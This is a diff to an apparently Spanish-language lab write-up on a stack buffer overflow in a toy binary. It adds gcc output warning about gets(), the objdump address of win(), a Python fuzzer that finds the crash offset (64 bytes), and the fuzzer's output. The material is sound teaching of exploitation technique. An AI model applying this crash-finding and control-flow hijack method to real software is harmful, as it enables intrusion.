@@ -19,7 +19,10 @@ compilacion:
 
 ``` bash
 
-gcc vuln.c -o vuln -fno-stack-protector -no-pie -m32 -Wno-implicit-function-declaration
+❯ gcc vuln.c -o vuln -fno-stack-protector -no-pie -m32 -Wno-implicit-function-declaration
+
+/usr/bin/x86_64-linux-gnu-ld.bfd: /tmp/ccCWeirH.o: in function `main':
+vuln.c:(.text+0x51): warning: the `gets' function is dangerous and should not be used.
 
 ```
 
@@ -29,11 +32,96 @@ conseguir direccion en memoria de la funcion wins():
 
 objdump -d vuln | grep win
 
+08049176 <win>:
+
+```
+``` py
+
+import subprocess
+
+for x in range(1, 100):
+    payload = "A" * x + "\n"
+
+    proc = subprocess.run(["./vuln"], input=payload, text=True, capture_output=True)
+
+    print(f"Trying {x} -> {proc.returncode}")
+
+    if proc.returncode != 0:
+        print(f"{x}")
+        break
+
 ```
 
 ``` bash
 
-gcc exploit.c -o exploit -m32
+❯ python3 fuzz_crash.py
+Trying 1 -> 0
+Trying 2 -> 0
+Trying 3 -> 0
+Trying 4 -> 0
+Trying 5 -> 0
+Trying 6 -> 0
+Trying 7 -> 0
+Trying 8 -> 0
+Trying 9 -> 0
+Trying 10 -> 0
+Trying 11 -> 0
+Trying 12 -> 0
+Trying 13 -> 0
+Trying 14 -> 0
+Trying 15 -> 0
+Trying 16 -> 0
+Trying 17 -> 0
+Trying 18 -> 0
+Trying 19 -> 0
+Trying 20 -> 0
+Trying 21 -> 0
+Trying 22 -> 0
+Trying 23 -> 0
+Trying 24 -> 0
+Trying 25 -> 0
+Trying 26 -> 0
+Trying 27 -> 0
+Trying 28 -> 0
+Trying 29 -> 0
+Trying 30 -> 0
+Trying 31 -> 0
+Trying 32 -> 0
+Trying 33 -> 0
+Trying 34 -> 0
+Trying 35 -> 0
+Trying 36 -> 0
+Trying 37 -> 0
+Trying 38 -> 0
+Trying 39 -> 0
+Trying 40 -> 0
+Trying 41 -> 0
+Trying 42 -> 0
+Trying 43 -> 0
+Trying 44 -> 0
+Trying 45 -> 0
+Trying 46 -> 0
+Trying 47 -> 0
+Trying 48 -> 0
+Trying 49 -> 0
+Trying 50 -> 0
+Trying 51 -> 0
+Trying 52 -> 0
+Trying 53 -> 0
+Trying 54 -> 0
+Trying 55 -> 0
+Trying 56 -> 0
+Trying 57 -> 0
+Trying 58 -> 0
+Trying 59 -> 0
+Trying 60 -> 0
+Trying 61 -> 0
+Trying 62 -> 0
+Trying 63 -> 0
+Trying 64 -> -11
+64
+╭─ ~/pwn                                                                                                           ✔ ─╮
+╰─                          
 
 ```
 
@@ -134,5 +222,12 @@ int main() {
 
     return 0;
 }
+
+```
+
+
+``` bash
+
+gcc exploit.c -o exploit -m32
 
 ```
